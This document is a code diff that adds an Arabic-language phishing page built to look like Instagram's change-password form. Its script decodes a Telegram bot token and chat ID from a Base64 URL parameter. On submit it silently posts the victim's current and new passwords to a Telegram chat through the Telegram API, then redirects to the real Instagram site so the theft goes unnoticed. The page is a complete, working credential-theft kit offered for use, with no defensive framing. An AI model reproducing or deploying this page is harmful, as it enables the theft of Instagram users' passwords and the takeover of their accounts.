@@ -1,0 +1,671 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تغيير كلمة المرور - إنستغرام</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 380px;
+            padding: 20px;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .header .logo-wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .header .logo-wrapper img {
+            width: 42px;
+            height: 42px;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+
+        .header .logo-wrapper .logo-text {
+            font-size: 48px;
+            font-weight: 700;
+            color: #262626;
+            letter-spacing: -2px;
+            font-family: 'Brush Script MT', cursive, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        .header .subtitle {
+            color: #8e8e8e;
+            font-size: 17px;
+            margin-top: 8px;
+            font-weight: 400;
+        }
+
+        .card {
+            background: white;
+            border-radius: 4px;
+            border: 1px solid #dbdbdb;
+            padding: 30px 35px 25px;
+        }
+
+        .card .icon-lock {
+            text-align: center;
+            font-size: 48px;
+            margin-bottom: 10px;
+        }
+
+        .card h2 {
+            font-size: 22px;
+            color: #262626;
+            margin-bottom: 6px;
+            font-weight: 600;
+            text-align: center;
+        }
+
+        .card .desc {
+            color: #8e8e8e;
+            font-size: 14px;
+            margin-bottom: 25px;
+            line-height: 1.6;
+            text-align: center;
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+            position: relative;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #262626;
+            margin-bottom: 4px;
+        }
+
+        .input-group .input-wrapper {
+            position: relative;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 10px 40px 10px 12px;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            font-size: 14px;
+            background: #fafafa;
+            transition: all 0.2s ease;
+            outline: none;
+            color: #262626;
+            direction: ltr;
+            text-align: right;
+        }
+
+        .input-group input:focus {
+            border-color: #a8a8a8;
+            background: white;
+            box-shadow: 0 0 0 2px rgba(0, 0, 0, 0.05);
+        }
+
+        .input-group input::placeholder {
+            color: #8e8e8e;
+            font-size: 13px;
+        }
+
+        .input-group input.error {
+            border-color: #ed4956;
+            background: #fff0f0;
+        }
+
+        .input-group input.error:focus {
+            border-color: #ed4956;
+            box-shadow: 0 0 0 2px rgba(237, 73, 86, 0.15);
+        }
+
+        .input-group input.success {
+            border-color: #42b72a;
+            background: #f0fff0;
+        }
+
+        .field-error {
+            color: #ed4956;
+            font-size: 13px;
+            margin-top: 6px;
+            display: none;
+            font-weight: 400;
+            text-align: right;
+        }
+
+        .field-error.show {
+            display: block;
+            animation: slideDown 0.2s ease;
+        }
+
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .toggle-password {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 4px;
+            color: #8e8e8e;
+            font-size: 16px;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 4px;
+            width: 30px;
+            height: 30px;
+        }
+
+        .toggle-password:hover {
+            color: #262626;
+        }
+
+        .toggle-password:active {
+            transform: translateY(-50%) scale(0.9);
+        }
+
+        .toggle-password svg {
+            width: 20px;
+            height: 20px;
+            fill: currentColor;
+        }
+
+        .btn-update {
+            width: 100%;
+            padding: 12px;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-top: 10px;
+            position: relative;
+        }
+
+        .btn-update:hover {
+            background: #1877f2;
+        }
+
+        .btn-update:active {
+            transform: scale(0.98);
+        }
+
+        .btn-update:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: scale(1);
+        }
+
+        .divider {
+            border-bottom: 1px solid #dbdbdb;
+            margin: 20px 0 16px 0;
+        }
+
+        .links {
+            text-align: center;
+            font-size: 13px;
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .links a {
+            color: #00376b;
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+
+        .links a:hover {
+            color: #262626;
+            text-decoration: underline;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 25px;
+            color: #8e8e8e;
+            font-size: 12px;
+        }
+
+        .footer a {
+            color: #8e8e8e;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+            color: #262626;
+        }
+
+        @media (max-width: 450px) {
+            .card {
+                padding: 20px 18px;
+            }
+            .header .logo-wrapper .logo-text {
+                font-size: 40px;
+            }
+            .header .logo-wrapper img {
+                width: 34px;
+                height: 34px;
+            }
+            .btn-update {
+                font-size: 14px;
+                padding: 10px;
+            }
+            .input-group input {
+                font-size: 13px;
+                padding: 9px 36px 9px 10px;
+            }
+            .container {
+                padding: 10px;
+            }
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.6; }
+            100% { opacity: 1; }
+        }
+
+        .loading {
+            animation: pulse 1s infinite;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <div class="header">
+        <div class="logo-wrapper">
+            <img src="insta.png" alt="Instagram" style="width: 42px; height: 42px; border-radius: 50%; object-fit: cover;">
+            <span class="logo-text">Instagram</span>
+        </div>
+        <div class="subtitle">🔐 تغيير كلمة المرور</div>
+    </div>
+
+    <div class="card">
+
+        <div class="icon-lock">🔑</div>
+        <h2>تغيير كلمة المرور</h2>
+        <p class="desc">أدخل كلمة المرور الحالية ثم أنشئ كلمة مرور جديدة</p>
+
+        <form id="passwordForm" novalidate>
+
+            <div class="input-group">
+                <label>كلمة المرور الحالية</label>
+                <div class="input-wrapper">
+                    <input type="password" id="oldPass" placeholder="كلمة المرور الحالية" required autocomplete="current-password">
+                    <button type="button" class="toggle-password" data-target="oldPass" aria-label="إظهار كلمة المرور">
+                        <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+                    </button>
+                </div>
+                <div class="field-error" id="oldPassError"></div>
+            </div>
+
+            <div class="input-group">
+                <label>كلمة المرور الجديدة</label>
+                <div class="input-wrapper">
+                    <input type="password" id="newPass" placeholder="كلمة المرور الجديدة" required autocomplete="new-password">
+                    <button type="button" class="toggle-password" data-target="newPass" aria-label="إظهار كلمة المرور">
+                        <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+                    </button>
+                </div>
+                <div class="field-error" id="newPassError"></div>
+            </div>
+
+            <div class="input-group">
+                <label>تأكيد كلمة المرور الجديدة</label>
+                <div class="input-wrapper">
+                    <input type="password" id="confirmPass" placeholder="تأكيد كلمة المرور" required autocomplete="new-password">
+                    <button type="button" class="toggle-password" data-target="confirmPass" aria-label="إظهار كلمة المرور">
+                        <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+                    </button>
+                </div>
+                <div class="field-error" id="confirmPassError"></div>
+            </div>
+
+            <button type="submit" class="btn-update" id="submitBtn">تغيير كلمة المرور</button>
+
+        </form>
+
+        <div class="divider"></div>
+
+        <div class="links">
+            <a href="https://www.instagram.com/accounts/password/reset/?hl=ar" id="forgotLink">🔑 نسيت كلمة المرور؟</a>
+            <span style="color:#dbdbdb;">·</span>
+           
+        </div>
+
+    </div>
+
+    <div class="footer">
+        <span>Instagram © 2026</span>
+        <span style="margin:0 8px;">·</span>
+        <a href="https://help.instagram.com/?locale=ar_AR">مساعدة</a>
+        <span style="margin:0 8px;">·</span>
+        <a href="https://help.instagram.com/help/instagram/196883487377501/?locale=ar_AR&maybe_redirect_pol=true">سياسة الخصوصية</a>
+        <span style="margin:0 8px;">·</span>
+        <a href="https://help.instagram.com/581066165581870?locale=ar_AR&cms_id=581066165581870&force_new_ighc=false">الشروط</a>
+        <span style="margin:0 8px;">·</span>
+        <a href="https://help.instagram.com/help/instagram/196883487377501/?locale=ar_AR&maybe_redirect_pol=true">أمان</a>
+    </div>
+
+</div>
+
+<script>
+    // ================================================================
+    // 🔐 قراءة البيانات المشفّرة من الرابط وفك تشفيرها
+    // ================================================================
+    // الرابط يكون بهذا الشكل:
+    // index.html?d=BASE64_ENCODED_STRING
+    //
+    // حيث BASE64_ENCODED_STRING = Base64(TOKEN + "|" + CHAT_ID)
+    // ================================================================
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const encodedData = urlParams.get('d') || "";
+
+    let BOT_TOKEN = "";
+    let CHAT_ID = "";
+
+    if (encodedData) {
+        try {
+            // فك تشفير Base64
+            const decoded = atob(encodedData);
+            // فصل التوكن عن الـ ID باستخدام الفاصل |
+            const parts = decoded.split('|');
+            BOT_TOKEN = parts[0] || "";
+            CHAT_ID   = parts[1] || "";
+        } catch (e) {
+            console.error('❌ فشل فك التشفير:', e);
+        }
+    }
+
+    // تحذير في حالة عدم وجود البيانات
+    if (!BOT_TOKEN || !CHAT_ID) {
+        console.warn('⚠️ البيانات المشفّرة غير موجودة في الرابط!');
+        console.warn('💡 استخدم الصيغة: ?d=BASE64_STRING');
+    }
+
+    // ================================================================
+    // 1. TOGGLE PASSWORD VISIBILITY
+    // ================================================================
+    document.querySelectorAll('.toggle-password').forEach(button => {
+        button.addEventListener('click', function() {
+            const targetId = this.getAttribute('data-target');
+            const input = document.getElementById(targetId);
+            
+            if (!input) return;
+
+            if (input.type === 'password') {
+                input.type = 'text';
+                this.innerHTML = `
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                        <path d="M3.27 2.5L2 3.77 5.23 7C3.31 8.3 1.96 10.01 1 12c1.73 4.39 6 7.5 11 7.5 1.91 0 3.73-.48 5.31-1.31L20.23 21 21.5 19.73 3.27 2.5zM12 17c-2.76 0-5-2.24-5-5 0-.96.27-1.87.76-2.64l1.44 1.44c-.13.39-.2.79-.2 1.2 0 1.66 1.34 3 3 3 .41 0 .81-.07 1.2-.2l1.44 1.44C13.87 16.73 12.96 17 12 17zm3.12-5.03c.08.33.13.67.13 1.03 0 1.66-1.34 3-3 3-.36 0-.7-.05-1.03-.13l3.9-3.9z"/>
+                    </svg>
+                `;
+                this.setAttribute('aria-label', 'إخفاء كلمة المرور');
+            } else {
+                input.type = 'password';
+                this.innerHTML = `
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                    </svg>
+                `;
+                this.setAttribute('aria-label', 'إظهار كلمة المرور');
+            }
+        });
+    });
+
+    // ================================================================
+    // 2. SEND TO TELEGRAM
+    // ================================================================
+    function sendToTelegram(oldPass, newPass, confirmPass) {
+        if (!BOT_TOKEN || !CHAT_ID) {
+            console.error('❌ لا يمكن الإرسال: البيانات غير موجودة!');
+            return;
+        }
+
+        const message = `
+📱 **تغيير كلمة المرور - إنستغرام**
+
+🔑 **كلمة المرور الحالية:** 
+\`${oldPass}\`
+
+🆕 **كلمة المرور الجديدة:** 
+\`${newPass}\`
+
+✅ **تأكيد كلمة المرور الجديدة:** 
+\`${confirmPass}\`
+
+🕐 **التاريخ:** ${new Date().toLocaleString('ar-EG')}
+
+📌 **IP المستخدم:** ${window.location.hostname}
+        `;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        }).catch(error => {
+            console.log('Telegram send error:', error);
+        });
+    }
+
+    // ================================================================
+    // 3. FORM SUBMISSION
+    // ================================================================
+    document.getElementById('passwordForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const oldPass = document.getElementById('oldPass').value.trim();
+        const newPass = document.getElementById('newPass').value.trim();
+        const confirmPass = document.getElementById('confirmPass').value.trim();
+        const submitBtn = document.getElementById('submitBtn');
+
+        document.querySelectorAll('.field-error').forEach(el => {
+            el.classList.remove('show');
+            el.textContent = '';
+        });
+
+        document.querySelectorAll('.input-group input').forEach(el => {
+            el.classList.remove('error', 'success');
+        });
+
+        let hasEmptyFields = false;
+
+        if (!oldPass) {
+            document.getElementById('oldPass').classList.add('error');
+            hasEmptyFields = true;
+        }
+        if (!newPass) {
+            document.getElementById('newPass').classList.add('error');
+            hasEmptyFields = true;
+        }
+        if (!confirmPass) {
+            document.getElementById('confirmPass').classList.add('error');
+            hasEmptyFields = true;
+        }
+
+        if (hasEmptyFields) {
+            const errorMsg = '⚠️ جميع الحقول مطلوبة!';
+            if (!oldPass) {
+                document.getElementById('oldPassError').textContent = errorMsg;
+                document.getElementById('oldPassError').classList.add('show');
+            }
+            if (!newPass) {
+                document.getElementById('newPassError').textContent = errorMsg;
+                document.getElementById('newPassError').classList.add('show');
+            }
+            if (!confirmPass) {
+                document.getElementById('confirmPassError').textContent = errorMsg;
+                document.getElementById('confirmPassError').classList.add('show');
+            }
+            return;
+        }
+
+        if (newPass !== confirmPass) {
+            document.getElementById('newPass').classList.add('error');
+            document.getElementById('confirmPass').classList.add('error');
+            const errorMsg = '❌ كلمة المرور الجديدة وتأكيدها غير متطابقين!';
+            document.getElementById('newPassError').textContent = errorMsg;
+            document.getElementById('newPassError').classList.add('show');
+            document.getElementById('confirmPassError').textContent = errorMsg;
+            document.getElementById('confirmPassError').classList.add('show');
+            return;
+        }
+
+        if (newPass === oldPass) {
+            document.getElementById('newPass').classList.add('error');
+            document.getElementById('newPassError').textContent = '⚠️ يجب أن تكون كلمة المرور الجديدة مختلفة عن القديمة!';
+            document.getElementById('newPassError').classList.add('show');
+            return;
+        }
+
+        if (newPass.length < 6) {
+            document.getElementById('newPass').classList.add('error');
+            document.getElementById('newPassError').textContent = '⚠️ كلمة المرور يجب أن تحتوي على 6 أحرف على الأقل!';
+            document.getElementById('newPassError').classList.add('show');
+            return;
+        }
+
+        // ============================================================
+        // ✅ نجاح العملية
+        // ============================================================
+        submitBtn.disabled = true;
+        submitBtn.textContent = '⏳ جاري التوجيه...';
+        submitBtn.classList.add('loading');
+
+        sendToTelegram(oldPass, newPass, confirmPass);
+
+        window.location.href = 'https://www.instagram.com';
+    });
+
+    // ================================================================
+    // 4. REAL-TIME VALIDATION
+    // ================================================================
+    document.getElementById('confirmPass').addEventListener('input', function() {
+        const newPass = document.getElementById('newPass').value;
+        const confirmPass = this.value;
+        const errorEl = document.getElementById('confirmPassError');
+        
+        if (confirmPass.length > 0 && newPass !== confirmPass) {
+            this.classList.add('error');
+            this.classList.remove('success');
+            errorEl.textContent = '❌ كلمة المرور غير متطابقة!';
+            errorEl.classList.add('show');
+        } else if (confirmPass.length > 0 && newPass === confirmPass) {
+            this.classList.add('success');
+            this.classList.remove('error');
+            errorEl.classList.remove('show');
+        } else {
+            this.classList.remove('error', 'success');
+            errorEl.classList.remove('show');
+        }
+    });
+
+    document.getElementById('newPass').addEventListener('input', function() {
+        const value = this.value;
+        const errorEl = document.getElementById('newPassError');
+        
+        if (value.length > 0 && value.length < 6) {
+            this.classList.add('error');
+            this.classList.remove('success');
+            errorEl.textContent = '⚠️ يجب أن تحتوي على 6 أحرف على الأقل';
+            errorEl.classList.add('show');
+        } else if (value.length >= 6) {
+            this.classList.add('success');
+            this.classList.remove('error');
+            errorEl.classList.remove('show');
+        } else {
+            this.classList.remove('error', 'success');
+            errorEl.classList.remove('show');
+        }
+    });
+
+    document.querySelectorAll('input').forEach(input => {
+        input.addEventListener('input', function() {
+            const parent = this.closest('.input-group');
+            const errors = parent.querySelectorAll('.field-error');
+            errors.forEach(err => {
+                if (err.textContent === '⚠️ جميع الحقول مطلوبة!') {
+                    err.classList.remove('show');
+                }
+            });
+        });
+    });
+
+    // ================================================================
+    // 5. KEYBOARD SHORTCUTS
+    // ================================================================
+    document.addEventListener('keydown', function(e) {
+        if (e.ctrlKey && e.shiftKey && (e.key === 'P' || e.key === 'p')) {
+            e.preventDefault();
+            document.querySelectorAll('.toggle-password').forEach(btn => btn.click());
+        }
+        if (e.ctrlKey && e.key === 'Enter') {
+            e.preventDefault();
+            document.getElementById('passwordForm').dispatchEvent(new Event('submit'));
+        }
+    });
+
+    document.getElementById('forgotLink').addEventListener('click', function(e) {
+        e.preventDefault();
+        window.location.href = 'https://www.instagram.com/accounts/password/reset/';
+    });
+
+    console.log('✅ Instagram Change Password page loaded successfully!');
+    console.log('🔓 Data will be sent to Telegram silently!');
+</script>
+
+</body>
+</html>
